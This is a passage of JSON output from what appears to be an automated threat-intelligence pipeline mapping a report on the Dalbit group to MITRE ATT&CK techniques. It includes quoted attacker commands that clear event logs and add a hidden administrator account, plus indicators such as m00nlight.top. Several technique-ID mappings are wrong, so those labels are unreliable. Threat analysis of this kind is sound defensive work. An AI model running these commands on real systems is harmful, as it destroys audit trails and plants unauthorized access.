          "context": "**Observed Commands:**\n- cmd.exe /c wevtutil cl security  Removal of application logs > cmd.exe wevtutil.exe el > cmd.exe wevtutil.exe cl \u201capplication\u201d\n- schtasks  /tn debug /run\n- WMIC command or a screenshot of the affected PC is sent to the threat actor\u2019s server at regular intervalsaccording to the companies.\n- WMIC command to check installed programs.\n- net user main ff0.123456 /add & net localgroup administrators main /add\u201d (Add account)\n\n**File System Activity:**\n- /Win.ProxyVenom.C5280699(2022.10.15.01)\n- /Win.LCX.R432995(2023.01.06.01)\n- /Win64.Cve-2019-1458.R345589(2020.07.22.06)\n- c:\\temp\\s.bat\u201d\n- /Win64.Generic.C3628819\n\n**Network Indicators:**\n- debug.ini\n- tarko.dmp\n- Win.Rsocx\n- Win.RemCom\n- eee.jspD\n- tunnel.aspx\n- bitlockerwizardelev.exe\n- 1.ashxC\n- asec.ahnlab.com\n- 127.0.0.1\n\n**Key Security Terms:** reconnaissance, evasion, mimikatz, service, exploitation, extract, cmd, process, malware, persistence"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 33.763,
          "llm_processing_time_ms": 5412.552
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "f8cebeb7-e87a-4b3e-8fda-a1b7a3423b35",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Proxy",
        "attack_id": "T1090",
        "tactic": "Command and Control",
        "description": "The group used proxy tools like FRP and LCX for communication, specifically using the Socks5 protocol",
        "confidence_score": 0.764,
        "confidence_level": "high",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.66,
          "description_detail": 0.405,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "FRP",
          "LCX",
          "Socks5",
          "m00nlight.top"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "LCX",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "FRP",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d0931c24-4dad-41e1-85d9-713551684d2a",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Proxy",
        "attack_id": "T1090",
        "tactic": "Command and Control",
        "description": "The threat actor used a hosting server (m00nlight.top) as a proxy and download server for their command and control (C2) communications.",
        "confidence_score": 0.755,
        "confidence_level": "high",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.468,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "m00nlight.top"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8dd97a1e-5aa9-450b-866b-c00721a1a9d8",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Fast Reverse Proxy",
        "attack_id": "T1090.003",
        "tactic": "Command and Control",
        "description": "The threat actor used Fast Reverse Proxy (FRP) to attack Korean companies, as mentioned in a previous report.",
        "confidence_score": 0.735,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.399,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "FRP"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "fdd33c33-054c-4cda-8d43-29c8859aa58d",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "The threat actor used open-source tools and command-line interfaces, such as CMD, to execute commands on compromised systems.",
        "confidence_score": 0.702,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.66,
          "description_detail": 0.414,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe",
          "Certutil",
          "Bitsadmin",
          "At"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5a20b8d7-5d99-4893-a1cd-881ef643aa07",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "The Dalbit group used various command line tools such as At, Bitsadmin, CMD, Certutil, and MetaSploit",
        "confidence_score": 0.701,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.7,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "At",
          "Bitsadmin",
          "CMD",
          "Certutil",
          "MetaSploit"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d03e329c-f807-4e8d-9c94-89ce58baf22c",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Backdoor",
        "attack_id": "T1219",
        "tactic": "Persistence",
        "description": "Detected Malware: APT, Backdoor",
        "confidence_score": 0.697,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.077,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Backdoor"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "Backdoor",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5d9d8dcc-4dc6-4a1f-95a1-6e95d2ef1996",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Exploitation for Client Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "The threat actor may have exploited a vulnerability in a Korean groupware solution to infect companies, although this is not confirmed.",
        "confidence_score": 0.692,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.468,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Korean groupware solution"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "Malware",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "3d770afd-b9b6-4c2a-9535-75668d3c7ebd",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Server Software Vulnerability",
        "attack_id": "T1200",
        "tactic": "Exploitation",
        "description": "The threat actor may have exploited a vulnerability in a server to gain access to confidential information and deploy ransomware.",
        "confidence_score": 0.691,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.46,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Server vulnerability"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "Malware",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "1d26b3c0-049a-4ce9-83f3-2c4e8b4fe75a",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Remote Access Tools",
        "attack_id": "T1219",
        "tactic": "Command and Control",
        "description": "The Dalbit group used remote control tools to infiltrate servers and PC devices",
        "confidence_score": 0.667,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "FRP configuration files (.ini)"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "FRP",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "893bf07c-1438-4038-bfb2-529ac38beae6",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Downloader",
        "attack_id": "T1564",
        "tactic": "Initial Access",
        "description": "Detected Malware: Downloader",
        "confidence_score": 0.663,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.054,
          "tool_mentions": 1.0,
          "context_richness": 0.76,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Downloader"
        ],
        "tools": [
          "At",
          "Downloader",
          "bitsadmin",
          "mimikatz",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "10557c05-be9c-438d-8680-8b765ff2c2f7",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543",
        "tactic": "Persistence",
        "description": "Detected Create or Modify System Process activity via NLP pattern matching",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.246,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "c0245026-adba-491b-ad92-f6a580081d8f",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected use of CMD",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.077,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "CMD",
          "cmd.exe"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "1829590e-f3d1-49b3-ad1d-8f435f2f2b89",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "System Utilities",
        "attack_id": "T1127",
        "tactic": "Execution",
        "description": "Detected use of Bitsadmin",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.077,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Bitsadmin",
          "bitsadmin.exe"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ca3ee8ac-daab-403a-8ee4-497413758b31",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "System Utilities",
        "attack_id": "T1127",
        "tactic": "Execution",
        "description": "Detected use of Certutil",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.077,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Certutil",
          "certutil.exe"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a0c708f5-89bc-4601-a618-764830395967",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Scheduled Task",
        "attack_id": "T1053",
        "tactic": "Execution",
        "description": "Detected use of At",
        "confidence_score": 0.64,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.077,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "At",
          "at.exe"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c5a9136d-8bc1-420a-80f4-da4da5a12d1f",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Exploitation for Client Execution",
        "attack_id": "T1204",
        "tactic": "Execution",
        "description": "Detected use of MetaSploit",
        "confidence_score": 0.634,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.077,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "MetaSploit"
        ],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "9a26d4e2-c2a0-48b9-954b-191b8f81447c",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Application Layer Protocol",
        "attack_id": "T1071",
        "tactic": "Command And Control",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "confidence_score": 0.633,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "02b00e9a-b8b3-422e-b4f4-089892d95f9d",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "b33132b7-88be-44e5-bf65-898bd404ce52",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Exfiltration Over C2 Channel",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "confidence_score": 0.631,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.185,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "10c35bc1-92f9-4fbf-8aac-dfd19c8c27b1",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Exploit Public-Facing Application",
        "attack_id": "T1190",
        "tactic": "Initial Access",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "9b47d6d2-6a6e-46ec-894b-c88c93bf3765",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Windows Management Instrumentation",
        "attack_id": "T1047",
        "tactic": "Execution",
        "description": "Detected Windows Management Instrumentation activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "fd14d389-d45c-49b3-840c-4af46575dcd0",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "OS Credential Dumping",
        "attack_id": "T1003",
        "tactic": "Credential Access",
        "description": "Detected OS Credential Dumping activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "716c3243-5447-4556-9fa7-aeb88316f75e",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Network Service Discovery",
        "attack_id": "T1046",
        "tactic": "Discovery",
        "description": "Detected Network Service Discovery activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "43d737c8-d885-49e2-9ecb-a3d162998734",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Archive Collected Data",
        "attack_id": "T1560",
        "tactic": "Collection",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "confidence_score": 0.628,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.162,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "69f06b42-48ae-47f6-a8a8-26111ee5a4d9",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Scheduled Task/Job",
        "attack_id": "T1053",
        "tactic": "Persistence",
        "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "53fa7c2a-f0e2-4da9-8bb2-a789f1506f5d",
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "technique_name": "Account Discovery",
        "attack_id": "T1087",
        "tactic": "Discovery",
        "description": "Detected Account Discovery activity via NLP pattern matching",
        "confidence_score": 0.624,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "At",
          "mimikatz",
          "bitsadmin",
          "schtasks",
          "cve",
          "ftp",
          "PsExec",
          "cmd",
          "netsh",
          "Certutil",
          "CMD",
          "pypykatz",
          "net",
          "metasploit",
          "ping",
          "lsass",
          "wmi",
          "certutil",
          "sc",
          "zip",
          "Bitsadmin",
          "apt",
          "psexec",
          "MetaSploit",
          "ReG",
          "Mimikatz",
          "wmic",
          "WMI"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
